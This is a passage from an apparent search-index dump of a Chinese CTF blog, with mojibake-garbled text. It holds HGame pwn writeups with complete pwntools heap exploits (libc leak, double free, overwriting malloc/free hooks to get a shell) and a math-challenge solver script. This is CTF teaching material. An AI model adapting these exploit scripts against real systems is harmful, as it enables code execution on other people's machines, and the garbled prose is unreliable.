\u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) sendline_after_clean(str(size), b\u0026#34;Size: \u0026#34;) sendline_after_clean(content, b\u0026#34;Content: \u0026#34;) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0x68, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x68, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) remove(2) # gdb.attach(p) show(2) base_addr = recv_and_transform() - 0x3c4b78 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] hook_addr = base_addr + libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x23 realloc_addr = base_addr + libc.sym[\u0026#39;__libc_realloc\u0026#39;] one = [0x45226, 0x4527a, 0xf03a4, 0xf1247] one_gadget = base_addr + one[3] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) remove(0) remove(1) remove(0) allocate(4, 0x68, pg(hook_addr)*2) allocate(5, 0x68, \u0026#34;\u0026#34;) # gdb.attach(p) allocate(6, 0x68, \u0026#34;\u0026#34;) payload = b\u0026#34;\\x00\u0026#34;*0xb + pg(one_gadget) + pg(realloc_addr+6) allocate(7, 0x68, payload) # gdb.attach(p) sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(\u0026#34;8\u0026#34;, b\u0026#34;Index: \u0026#34;) sendline_after_clean(\u0026#34;0\u0026#34;, b\u0026#34;Size: \u0026#34;) interactive_after_clean() new_fast_note checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªCä»£ç  å…¸å‹çš„å †èœå•é¢˜ï¼Œè¿™é‡Œæ¯”è¾ƒé‡è¦çš„æ˜¯ï¼š\nè™½ç„¶è¡¨é¢ä¸Šé™åˆ¶åˆ†é…15ä¸ªchunkï¼Œä½†æ˜¯å®ƒå¹¶ä¸æ£€æŸ¥å¯¹åº”çš„indexæ˜¯å¦å·²æœ‰chunkï¼Œè¿™å¯¼è‡´æˆ‘ä»¬å¯ä»¥åˆ†é…ä»»æ„ä¸ªchunk\nå†åŠ ä¸Šfreeåä¸ç½®é›¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°libcåŸºå€ï¼š\né‚£ä¹ˆï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§æ€è·¯ï¼š\nunsorted binæ³„éœ²libcåå¾€tcache binä¸­å¡«å…¥7ä¸ª0x10çš„chunkï¼Œè¿›è¡Œfastbin double free æ³„éœ²libcåç›´æ¥tcache attack åœ¨fast_noteä¸­æˆ‘ä»¬å·²ç»è¯¦ç»†è®²è¿‡ç¬¬äºŒç§æ–¹æ³•äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç¬¬ä¸€ç§æ–¹æ³•\nå°è´´å£« åœ¨å¾€tcache binä¸­å¡«å…¥0x10chunkå—çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåˆ†é…7ä¸ªchunkå—ï¼Œè¿™æ—¶å€™ï¼Œç”±äºunsorted binä¸­è¿˜ä¿ç•™ç€0x80çš„å †å—ä¸€ä¸ªï¼Œæ‰€ä»¥ç¨‹åºä¼šå¯¹å…¶åˆ†å‰²\nä½†æ˜¯0x80çš„sizeä½ä¸º0x90ï¼Œåªèƒ½åˆ†é…æˆ0x90=0x20*3+0x30è¿™å››ä¸ªå †å—ï¼Œå› æ­¤åˆ†é…çš„ç¬¬å››ä¸ªå †å—çš„å¤§å°ä¸º0x30\nä½†æ˜¯è¿™æ ·å­ç¬¬å››ä¸ªchunké‡Šæ”¾çš„æ—¶å€™ï¼Œå°±æ— æ³•è¿›å…¥0x20çš„tcache binï¼Œè€Œæ˜¯è¿›å…¥0x30çš„tcache binï¼Œå› æ­¤è·ç¦»tcache binè¢«å¡«æ»¡å°±åˆšå¥½å·®ä¸€ä¸ª\nå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ†é…8ä¸ªchunkè€Œä¸æ˜¯7ä¸ª\nå¯èƒ½æœ‰ç‚¹éš¾ç†è§£ï¼Œå…·ä½“çœ‹æˆ‘ä»£ç ç„¶åè‡ªå·±è°ƒè¯•çœ‹ä¸‹\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-new_fast_note\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31780\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # argsæ˜¯å˜é‡åï¼Œæ˜¯å­—ç¬¦ä¸² for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) sendline_after_clean(str(size), b\u0026#34;Size: \u0026#34;) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(7, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(8, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) remove(0) remove(1) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) show(7) main_arena_offset = 0x1ECB80 base_addr = recv_and_transform() - main_arena_offset - 96 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] hook_addr = base_addr + libc.sym[\u0026#39;__free_hook\u0026#39;] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) allocate(0, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(7, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(9, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(10, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) remove(0) remove(1) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) # gdb.attach(p) remove(9) remove(10) remove(9) allocate(0, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) allocate(9, 0x10, pg(hook_addr)) # gdb.attach(p) allocate(10, 0x10, pg(hook_addr)) allocate(11, 0x10, pg(hook_addr)) allocate(12, 0x10, pg(system_addr)) remove(8) interactive_after_clean() ","date":"2023å¹´01æœˆ21æ—¥","permalink":"https://peterliuzhi.top/writeup/hgame-week2-pwn-writeup/","section":"writeup","summary":"I\u0026rsquo;d rather attempt to do something great and fail than to attempt to do nothing and succeed. â€” Robert Schuller ä¸ŠæœŸè§è¿™é‡Œ YukkuriSay checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ å‘ç°äº†canaryï¼Œä½†æ˜¯è¿™é¢˜æº¢å‡ºä¸åˆ°canaryï¼Œé‚£ä¹ˆå¯èƒ½å¯ä»¥åˆ©ç”¨ca","tags":["pwn","æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´","tcache attack","hook edit","fastbin attack","main_arena leak"],"title":"HGame Week2 PWN WriteUp"},{"categories":null,"contents":" éš”å£è€äº•çš„éš”å£çš„åšå®¢\ra weber\u0026#39;s blog\rPara-L1lasçš„åšå®¢\rA WEB SECURITY BLOG\r","date":"2023å¹´01æœˆ19æ—¥","permalink":"https://peterliuzhi.top/friend/links/","section":"friend","summary":"éš”å£è€äº•çš„éš”å£çš„åšå®¢ a weber\u0026#39;s blog Para-L1lasçš„åšå®¢ A WEB SECURITY BLOG","tags":null,"title":"Links"},{"categories":["tricks"],"contents":" The only real failure in life is not to be true to the best one knows. â€” Buddha\næœ‰æ—¶å€™miscé¢˜ç›®ä¼šå‡ºä¸€äº›è¿ç»­è§£å‡ ç™¾ä¸ªç®€å•æ•°å­¦é¢˜ç„¶åæ‰èƒ½get flagçš„é¢˜ç›®ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pwntoolsè¿›è¡Œäº¤äº’å¹¶ä½¿ç”¨evalè§£é¢˜\næ³¨æ„ï¼Œæ­¤è„šæœ¬åªèƒ½è§£æ™®é€šæ•°å­¦è®¡ç®—å¼ï¼ˆåŠ å‡ä¹˜é™¤æ¨¡ï¼Œä»¥åŠåœ¨pythonä¸­ç¬¦åˆè¯­æ³•çš„è¡¨è¾¾å¼ï¼‰ï¼Œè€Œä¸€äº›è‹±æ–‡è®¡ç®—å¼æˆ–è€…ä¸­æ–‡è®¡ç®—å¼è¦è‡ªå·±å†™ä¸€ä¸ªè½¬æ¢å‡½æ•°å°†å…¶è½¬åŒ–ä¸ºæ•°å­¦è®¡ç®—å¼ï¼Œä¸€èˆ¬æ¥è¯´å¯ä»¥ä½¿ç”¨å“ˆå¸Œè¡¨\nLinuxä¸­æ²¡æœ‰pwntoolså¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…ï¼š\napt-get update apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools å…·ä½“è¯¦è§Installation â€” pwntools 4.8.0 documentation\nä»¥ä¸‹æ˜¯è„šæœ¬ï¼š\n# è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 website = \u0026#34;www.example.com\u0026#34; port: str = \u0026#34;666\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) p = remote(website, port) # ä¸‹é¢æ˜¯è‡ªå®šä¹‰çš„ä¸€äº›å·¥å…·å‡½æ•° def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) for i in range(100): # ä»æ ‡å‡†è¾“å‡ºæµè·å–é¢˜ç›® # ä¼šä¸€ç›´è¯»åˆ°b\u0026#34;.\u0026#34;ä¸ºæ­¢ question = p.recvuntil(b\u0026#34;.\u0026#34;) # å·¥å…·å‡½æ•°è‡ªåŠ¨è®¡ç®—ç»“æœ # æ³¨æ„ï¼Œè¾“å…¥çš„é¢˜ç›®å¿…é¡»æ˜¯æœ‰æ„ä¹‰çš„ç®—å¼ï¼Œä¸èƒ½æœ‰ç­‰å· # æ¯”å¦‚å¯ä»¥æ˜¯1+2, 1Ã·2 # å¦‚æœéœ€è¦å°æ•°ï¼Œå®šä¹‰å‚æ•°precise=True answer = formula_compute(question) # åœ¨ç»“å°¾åŠ ä¸Šå›è½¦å‘é€answer # ç›´åˆ°è¯»åˆ°\u0026#34;answer:\u0026#34;æ‰å¼€å§‹å‘é€ # ä¹Ÿå¯ä»¥ä¸å®šä¹‰untilå­—ç¬¦ä¸²ï¼Œè„šæœ¬ä¼šåœ¨ç¨‹åºæ²¡æœ‰è¾“å‡ºçš„æ—¶å€™å‘é€ï¼ˆä½†å¦‚æœç½‘ç»œä¸å¥½ï¼Œè„šæœ¬å¯èƒ½åˆ¤æ–­å‡ºé”™ï¼‰ sendline_after_clean(answer, \u0026#34;answer:\u0026#34;) # è¿›å…¥äººæœºäº¤äº’æ¨¡å¼ interactive_after_clean() è„šæœ¬ä¸­çš„æ³¨é‡Šåº”è¯¥è¶³å¤Ÿäº†\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰Linuxä¸­æ‰èƒ½ä½¿ç”¨pwntools\n","date":"2023å¹´01æœˆ18æ—¥","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8pwntools%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92%E8%A7%A3misc%E6%95%B0%E5%AD%A6%E9%A2%98/","section":"tricks","summary":"The only real failure in life is not to be true to the best one knows. â€” Buddha æœ‰æ—¶å€™miscé¢˜ç›®ä¼šå‡ºä¸€äº›è¿ç»­è§£å‡ ç™¾ä¸ªç®€å•æ•°å­¦é¢˜ç„¶åæ‰èƒ½get flagçš„é¢˜ç›®ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pwntoolsè¿›","tags":["misc","pwntools","è§£æ™®é€šæ•°å­¦é¢˜"],"title":"ä½¿ç”¨pwntoolsä¸è¿œç¨‹äº¤äº’è§£miscæ•°å­¦é¢˜"},{"categories":["writeup","HGame"],"contents":" The greatest healing therapy is friendship and love. â€” Hubert Humphrey\ntest_nc ncè¿ä¸Šè¿œç¨‹ç›´æ¥cat flag\neasy_overflow checksec ida ç®€å•çš„æ ˆæº¢å‡ºï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯åœ¨get shellå‰å°†æ ‡å‡†è¾“å‡ºæµå…³æ‰äº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨shellå‘½ä»¤ä¸­çš„é‡å®šå‘å°†æ ‡å‡†è¾“å‡ºæµé‡å®šå‘åˆ°æ ‡å‡†é”™è¯¯æµï¼š\nexec 1\u0026gt;\u0026amp;2 cat flag å°±å¯ä»¥äº†\nexp # è‡ªåŠ¨ç”Ÿæˆå¤´éƒ¨ from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-vuln\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30818\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;æ— æ³•è½¬æ¢{value}æˆ–ä¸å­˜åœ¨ç±»å‹{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;Ã·\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 